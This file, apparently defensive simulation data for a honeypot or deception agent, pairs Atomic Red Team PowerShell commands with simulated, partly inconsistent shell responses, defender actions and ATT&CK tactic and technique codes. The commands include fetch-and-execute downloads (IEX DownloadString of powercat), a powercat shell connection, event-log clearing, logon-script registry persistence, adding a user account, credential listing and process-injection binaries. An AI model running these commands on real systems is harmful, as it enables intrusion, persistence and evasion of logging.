@@ -1,0 +1,4334 @@
+action:{ Restore to original state }
+command:whoami
+response:chris  
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ if response is upload or download, Block this command by the network traffic }
+command:New-Item -Type Directory (split-path C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe) -ErrorAction ignore | Out-Null
+response:New-Item : Cannot create directory C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe: Access to the path is denied.  
+At line:1 char:1  
++ New-Item -Type Directory (split-path C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe) -ErrorAction ignore | Out-Null  
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
+    + CategoryInfo          : UnauthorizedAccess: (C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe:String) [New-Item], IOException  
+    + FullyQualifiedErrorId : CreateDirectoryUnauthorizedAccessError,Microsoft.PowerShell.Commands.NewItemCommand  
+
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/T1055.011_x64.exe" -OutFile "C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe" -UseBasicParsing
+response:Invoke-WebRequest : The remote name could not be resolved: 'github.com'  
+At line:1 char:1  
++ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/T1055.011_x64.exe" -OutFile "C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe" -UseBasicParsing  
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
+    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:Htt   pWebRequest) [Invoke-WebRequest], WebException  
+    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand  
+
+PS C:\Users\chris>
+action:{ Restore to original state }
+command:whoami
+response:
+chris
+PS C:\Users\chris>
+
+tactic:4
+technique:120
+
+
+action:{ Restore to original state }
+command:copy C:\Windows\System32\cmd.exe C:\lsm.exe
+response:Copy-Item : Access to the path 'C:\lsm.exe' is denied.
+At line:1 char:1
++ copy C:\Windows\System32\cmd.exe C:\lsm.exe
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (C:\lsm.exe:String) [Copy-Item], UnauthorizedAccessException
+    + FullyQualifiedErrorId : ItemUnauthorizedAccessError,Microsoft.PowerShell.Commands.CopyItemCommand
+PS C:\Users\chris>
+tactic:1
+technique:112
+
+
+action:{ Restore to original state }
+command:C:\lsm.exe /c echo T1036.003 > C:\T1036.003.txt
+response:'C:\lsm.exe' is not recognized as an internal or external command,
+operable program or batch file.
+PS C:\Users\chris>
+tactic:0
+technique:9
+
+
+action:{ Restore to original state }
+command:Write-Host "Setup C2 server manually"
+response:Setup C2 server manually
+PS C:\Users\chris>
+action:{ Restore to original state }
+command:whoami
+response:
+chris
+PS C:\Users\chris>
+
+tactic:11
+technique:66
+
+
+action:{ Restore to original state }
+command:[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+response:PS C:\Users\chris>
+tactic:1
+technique:40
+
+
+action:{ Restore to original state }
+command:New-Item -Type Directory (split-path "C:\atomics\..\ExternalPayloads\AdFind.exe") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:0
+technique:3
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe" -OutFile "C:\atomics\..\ExternalPayloads\AdFind.exe"
+response:Invoke-WebRequest : The term 'Invoke-WebRequest' is not recognized as a name of a cmdlet, function, script file, or executable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red ...
++ ~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (Invoke-WebRequest:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+
+PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ Restore to original state }
+command:"C:\atomics\..\ExternalPayloads\AdFind.exe" -f (objectcategory=group) None
+response:'C:\atomics\..\ExternalPayloads\AdFind.exe' is not recognized as an internal or external command,
+operable program or batch file.
+
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Restore to original state }
+command:New-Item -Type Directory (split-path "C:\atomics\T1055.015\bin\ListPlanting.exe") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ if response contain network speed, Degrade the network speed }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.015/bin/ListPlanting.exe" -OutFile "C:\atomics\T1055.015\bin\ListPlanting.exe"
+response:Invoke-WebRequest : The term 'Invoke-WebRequest' is not recognized as a name of a cmdlet, function, script file, or executable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-tea ...
++ ~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (Invoke-WebRequest:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ if response is upload or download, Block this command by the network traffic }
+command:Start-Process "C:\atomics\T1055.015\bin\ListPlanting.exe"
+response:Start-Process : This command is blocked by network traffic policies.
+
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:Start-Sleep -Seconds 7
+response:PS C:\Users\chris>
+tactic:8
+technique:163
+
+
+action:{ Restore to original state }
+command:Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force
+response:PS C:\Users\chris>
+tactic:7
+technique:42
+
+
+action:{ Restore to original state }
+command:echo Sorry, Promoting this machine to a Domain Controller must be done manually
+response:Sorry, Promoting this machine to a Domain Controller must be done manually
+PS C:\Users\chris>
+action:{ Restore to original state }
+command:whoami
+response:
+chris
+PS C:\Users\chris>
+
+tactic:1
+technique:189
+
+
+action:{ Restore to original state }
+command:New-Item -Type Directory (split-path "C:\atomics\T1127.001\src\vb.xml") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+
+tactic:1
+technique:189
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1127.001/src/vb.xml" -OutFile "C:\atomics\T1127.001\src\vb.xml"
+response:Invoke-WebRequest : The remote name could not be resolved: 'github.com'
+At line:1 char:1
++ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/ ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.WebRequest:WebRequest) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : WebErrorResponseException
+PS C:\Users\chris>
+tactic:1
+technique:189
+
+
+action:{ Restore to original state }
+command:C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe "C:\atomics\T1127.001\src\vb.xml"
+response:Microsoft (R) Build Engine version 4.8.3761.0 for .NET Framework
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Build started 10/15/2023 10:00:00 AM.
+Project "C:\atomics\T1127.001\src\vb.xml" on node 1 (default targets).
+GenerateBindingRedirects:
+  No changes required to the projects.
+Build succeeded.
+
+Time Elapsed 00:00:00.82
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Restore to original state }
+command:New-Item -Type Directory (split-path C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe) -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/T1055.011_x64.exe" -OutFile "C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe" -UseBasicParsing
+response:Invoke-WebRequest : The remote name could not be resolved: 'github.com'
+At line:1 char:1
++ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/ ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.WebRequest:WebRequest) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : WebErrorResponseException
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/payload.exe_x64.bin" -OutFile "C:\atomics\T1055.011\bin\payload.exe_#{arch}.bin" -UseBasicParsing
+response:Invoke-WebRequest : The remote name could not be resolved: 'github.com'
+At line:1 char:1
++ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/ ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.WebRequest:WebRequest) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : WebErrorResponseException
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe
+response:'C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe' is not recognized as an internal or external command,
+operable program or batch file.
+PS C:\Users\chris>
+tactic:4
+technique:103
+
+
+action:{ Restore to original state }
+command:wevtutil cl System
+response:Specified event log (System) cleared.
+PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ Restore to original state }
+command:New-Item -Type Directory (split-path "C:\atomics\T1010\src\T1010.cs") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:4
+technique:10
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs -OutFile "C:\atomics\T1010\src\T1010.cs"
+response:Invoke-WebRequest : The remote name could not be resolved: 'raw.githubusercontent.com'
+At line:1 char:1
++ Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atom ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.WebRequest:WebRequest) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : WebErrorResponseException
+PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ Restore to original state }
+command:C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:%TEMP%\T1010.exe "C:\atomics\T1010\src\T1010.cs"
+response:Microsoft (R) Visual C# 2010 Compiler version 4.0.30319.1
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+C:\atomics\T1010\src\T1010.cs(1,1): error CS1002: ; expected
+C:\atomics\T1010\src\T1010.cs(1,1): error CS1519: Invalid token '=' in class, struct, or interface member declaration
+C:\atomics\T1010\src\T1010.cs(1,1): error CS1022: Type or namespace definition, or end-of-file expected
+
+Compilation failed: 4 Error(s), 0 Warning(s)
+PS C:\Users\chris>
+tactic:0
+technique:10
+
+
+action:{ Restore to original state }
+command:%TEMP%\T1010.exe
+response:'%TEMP%\T1010.exe' is not recognized as an internal or external command,
+operable program or batch file.
+PS C:\Users\chris>
+tactic:6
+technique:1
+
+
+action:{ Restore to original state }
+command:if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {
+response:PS C:\Users\chris>
+tactic:6
+technique:165
+
+
+action:{ Restore to original state }
+command:  Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online
+response:Add-WindowsCapability : Invalid capability name.
+At line:1 char:1
++ Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirecto ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidArgument: (:) [Add-WindowsCapability], Exception
+    + FullyQualifiedErrorId : Microsoft.Management.Infrastructure.CimException
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Restore to original state }
+command:} else {
+response:PS C:\Users\chris>
+tactic:6
+technique:62
+
+
+action:{ Restore to original state }
+command:  Install-WindowsFeature RSAT-AD-PowerShell
+response:Install-WindowsFeature : The term 'Install-WindowsFeature' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+PS C:\Users\chris>
+tactic:0
+technique:189
+
+
+action:{ Block this command this time }
+command:}
+response:PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ Restore to original state }
+command:Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=524288)' -Server $env:UserDnsDomain
+response:Get-ADObject : The term 'Get-ADObject' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ Restore to original state }
+command:New-Item -Type Directory (split-path "C:\atomics\T1010\src\T1010.cs") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ modify powershell response }
+command:Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs -OutFile "C:\atomics\T1010\src\T1010.cs"
+response:Invoke-WebRequest : The remote name could not be resolved: 'raw.githubusercontent.com'
+At line:1 char:1
++ Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atom ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.WebRequest:WebRequest) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : WebErrorResponseException
+PS C:\Users\chris>
+tactic:0
+technique:10
+
+
+action:{ Restore to original state }
+command:C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:%TEMP%\T1010.exe "C:\atomics\T1010\src\T1010.cs"
+response:Microsoft (R) Visual C# 2010 Compiler version 4.0.30319.1
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+C:\atomics\T1010\src\T1010.cs(1,1): error CS1002: ; expected
+C:\atomics\T1010\src\T1010.cs(1,1): error CS1519: Invalid token '=' in class, struct, or interface member declaration
+C:\atomics\T1010\src\T1010.cs(1,1): error CS1022: Type or namespace definition, or end-of-file expected
+
+Compilation failed: 4 Error(s), 0 Warning(s)
+PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ Restore to original state }
+command:%TEMP%\T1010.exe
+response:'%TEMP%\T1010.exe' is not recognized as an internal or external command,
+operable program or batch file.
+PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ Restore to original state }
+command:net user
+response:User accounts for \\HSLAB
+
+-------------------------------------------------------------------------------
+Administrator            Guest                   chris                    
+The command completed successfully.
+PS C:\Users\chris>
+tactic:6
+technique:103
+
+
+action:{ Restore to original state }
+command:dir c:\Users\
+response:Volume in drive C has no label.
+Volume Serial Number is XXXX-XXXX
+
+Directory of C:\Users
+
+04/15/2023  10:32 AM    <DIR>          Administrator
+04/15/2023  10:32 AM    <DIR>          Default Account
+04/15/2023  10:32 AM    <DIR>          chris
+               0 File(s)              0 bytes
+               3 Dir(s)  100,000,000 bytes free
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:cmdkey.exe /list
+response:Credential Manager credentials:
+
+Target: MicrosoftAccount:example@example.com
+    Last Access: 10/15/2023 12:00:00 PM
+    Type: Generic
+
+Target: LegacyGeneric:example
+    Last Access: 10/15/2023 12:00:00 PM
+    Type: Generic
+
+PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ Restore to original state }
+command:net localgroup "Users"
+response:Aliases for \\HSLAB
+
+Group name     : Users
+Comment        : Built-in users
+
+Members
+
+-------------------------------------------------------------------
+Administrator
+chris
+The command completed successfully.
+PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ Restore to original state }
+command:net localgroup
+response:Alias name     Users
+Comment         Built-in users
+
+Members
+
+-------------------------------------------------------------------
+Administrator
+chris
+
+Alias name     Administrators
+Comment         Administrators have complete and unrestricted access
+                to the computer/domain
+
+Members
+
+-------------------------------------------------------------------
+Administrator
+
+The command completed successfully.
+PS C:\Users\chris>
+tactic:1
+technique:17
+
+
+action:{ Restore to original state }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris>
+tactic:5
+technique:17
+
+
+action:{ Restore to original state }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:ERROR: The system was unable to find the specified registry key or value.
+
+PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ Restore to original state }
+command:([adsisearcher]"objectcategory=group").FindAll(); ([adsisearcher]"objectcategory=group").FindOne()
+response:PS C:\Users\chris>
+tactic:5
+technique:17
+
+
+action:{ Restore to original state }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris>
+tactic:5
+technique:17
+
+
+action:{ Restore to original state }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:ERROR: The system was unable to find the specified registry key or value.
+
+PS C:\Users\chris>
+tactic:5
+technique:65
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1114.001/src/Get-Inbox.ps1" -OutFile "C:\atomics\T1114.001\src\Get-Inbox.ps1"
+response:Invoke-WebRequest : The remote name could not be resolved: 'raw.githubusercontent.com'
+At line:1 char:1
++ Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atom ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.WebRequest:WebRequest) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : WebErrorResponseException
+PS C:\Users\chris>
+tactic:1
+technique:65
+
+
+action:{ Restore to original state }
+command:powershell -executionpolicy bypass -command "C:\atomics\T1114.001\src\Get-Inbox.ps1" -file $env:TEMP\mail.csv
+response:'C:\atomics\T1114.001\src\Get-Inbox.ps1' is not recognized as a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+PS C:\Users\chris>
+tactic:0
+technique:17
+
+
+action:{ Restore to original state }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris>
+tactic:0
+technique:17
+
+
+action:{ Restore to original state }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:ERROR: The system was unable to find the specified registry key or value.
+
+PS C:\Users\chris>
+tactic:7
+technique:40
+
+
+action:{ Restore to original state }
+command:echo Sorry, Promoting this machine to a Domain Controller must be done manually
+response:Sorry, Promoting this machine to a Domain Controller must be done manually
+PS C:\Users\chris>
+tactic:11
+technique:106
+
+
+action:{ Restore to original state }
+command:vssadmin.exe create shadow /for=C:
+response:Error: The volume C: is not supported for shadow copies. 
+
+PS C:\Users\chris>
+tactic:6
+technique:165
+
+
+action:{ Restore to original state }
+command:if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {
+response:PS C:\Users\chris>
+tactic:6
+technique:1
+
+
+action:{ Restore to original state }
+command:  Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online
+response:Add-WindowsCapability : Invalid capability name.
+At line:1 char:1
++ Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirecto ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidArgument: (:) [Add-WindowsCapability], Exception
+    + FullyQualifiedErrorId : Microsoft.Management.Infrastructure.CimException
+PS C:\Users\chris>
+tactic:6
+technique:141
+
+
+action:{ Restore to original state }
+command:} else {
+response:PS C:\Users\chris>
+tactic:5
+technique:1
+
+
+action:{ Restore to original state }
+command:  Install-WindowsFeature RSAT-AD-PowerShell
+response:Install-WindowsFeature : The term 'Install-WindowsFeature' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+PS C:\Users\chris>
+tactic:0
+technique:189
+
+
+action:{ Restore to original state }
+command:}
+response:PS C:\Users\chris>
+tactic:5
+technique:200
+
+
+action:{ Restore to original state }
+command:ldifde.exe -f C:\Windows\temp\atomic_ldifde.txt -p subtree
+response:LDIFDE: Import/Export Directory for Microsoft Active Directory
+
+Exporting directory to 'C:\Windows\temp\atomic_ldifde.txt' with scope 'subtree'.
+No objects found in the specified context.
+
+PS C:\Users\chris>
+tactic:1
+technique:29
+
+
+action:{ Restore to original state }
+command:New-Item -Type Directory (split-path "C:\atomics\T1059.003\src\t1059.003_cmd.cmd") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:3
+technique:29
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1059.003/src/t1059.003_cmd.cmd" -OutFile "C:\atomics\T1059.003\src\t1059.003_cmd.cmd"
+response:Invoke-WebRequest : The remote name could not be resolved: 'github.com'
+At line:1 char:1
++ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/ ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.WebRequest:WebRequest) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : WebErrorResponseException
+PS C:\Users\chris>
+tactic:6
+technique:29
+
+
+action:{ Restore to original state }
+command:cmd /r cmd<"C:\atomics\T1059.003\src\t1059.003_cmd.cmd"
+response:'cmd' is not recognized as an internal or external command,
+operable program or batch file.
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ modify powershell response }
+command:New-Item -Type Directory (split-path "C:\atomics\T1055.004\bin\T1055.exe") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.004/bin/T1055.exe" -OutFile "C:\atomics\T1055.004\bin\T1055.exe"
+response:Invoke-WebRequest : The remote name could not be resolved: 'github.com'
+At line:1 char:1
++ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/ ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.WebRequest:WebRequest) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : WebErrorResponseException
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:"C:\atomics\T1055.004\bin\T1055.exe"
+response:'C:\atomics\T1055.004\bin\T1055.exe' is not recognized as an internal or external command,
+operable program or batch file.
+PS C:\Users\chris>
+tactic:4
+technique:29
+
+
+action:{ Restore to original state }
+command:whoami
+response:
+chris
+PS C:\Users\chris>
+
+tactic:5
+technique:37
+
+
+action:{ Restore to original state }
+command:net user /add "T1136.001_CMD" "T1136.001_CMD!"
+response:The syntax of this command is:
+NET USER [username [password | *] [options]] 
+
+For a list of options, type NET USER /? 
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:
+command:New-Item -Type Directory (split-path "C:\atomics\T1055.004\bin\T1055.exe") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.004/bin/T1055.exe" -OutFile "C:\atomics\T1055.004\bin\T1055.exe"
+response:PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Restore to original state }
+command:"C:\atomics\T1055.004\bin\T1055.exe"
+response:PS C:\Users\chris>
+tactic:0
+technique:17
+
+
+action:{ Restore to original state }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris>
+tactic:7
+technique:17
+
+
+action:{ Restore to original state }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:PS C:\Users\chris>
+action:{ Restore to original state }
+command:whoami
+response:
+chris
+PS C:\Users\chris>
+
+tactic:1
+technique:29
+
+
+action:{ if response contain network speed, Degrade the network speed }
+command:IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')
+response:Invoke-WebRequest : The request was blocked because of a potential security violation.
+At line:1 char:1
++ IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubus ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : WebCmdletWebException
+PS C:\Users\chris>
+tactic:8
+technique:1
+
+
+action:{ Restore to original state }
+command:powercat -c 127.0.0.1 -p 80
+response:powercat : The term 'powercat' is not recognized as the name of a cmdlet, function, script file, or operable program.
+At line:1 char:1
++ powercat -c 127.0.0.1 -p 80
++ ~~~~~~~~ 
+    + CategoryInfo          : ObjectNotFound: (powercat:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+PS C:\Users\chris>
+tactic:1
+technique:110
+
+
+action:{ if response contain network speed, Degrade the network speed }
+command:ping -n 4 8.8.8.8
+response:Pinging 8.8.8.8 with 32 bytes of data:
+Reply from 8.8.8.8: bytes=32 time=15ms TTL=117
+Reply from 8.8.8.8: bytes=32 time=14ms TTL=117
+Reply from 8.8.8.8: bytes=32 time=15ms TTL=117
+Reply from 8.8.8.8: bytes=32 time=14ms TTL=117
+
+Ping statistics for 8.8.8.8:
+    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
+Approximate round trip times in milli-seconds:
+    Minimum = 14ms, Maximum = 15ms, Average = 14ms
+PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ Restore to original state }
+command:New-Item -Type Directory (split-path "C:\atomics\T1010\src\T1010.cs") -ErrorAction ignore | Out-Null
+response:New-Item : The given path's format is not supported.
+At line:1 char:1
++ New-Item -Type Directory (split-path "C:\atomics\T1010\src\T1010.cs") ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [New-Item], UriFormatException
+    + FullyQualifiedErrorId : RuntimeException,Microsoft.PowerShell.Commands.NewItemCommand
+PS C:\Users\chris>
+tactic:4
+technique:10
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs -OutFile "C:\atomics\T1010\src\T1010.cs"
+response:Invoke-WebRequest : The request was blocked because of a potential security violation.
+At line:1 char:1
++ Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs -OutFile "C:\atomics\T1010\src\T1010.cs"
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : WebCmdletWebException
+PS C:\Users\chris>
+action:{ Restore to original state }
+command:whoami
+response:
+chris
+PS C:\Users\chris>
+
+tactic:1
+technique:17
+
+
+action:{ Restore to original state }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris>
+
+tactic:1
+technique:17
+
+
+action:{ Restore to original state }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:PS C:\Users\chris>
+
+tactic:1
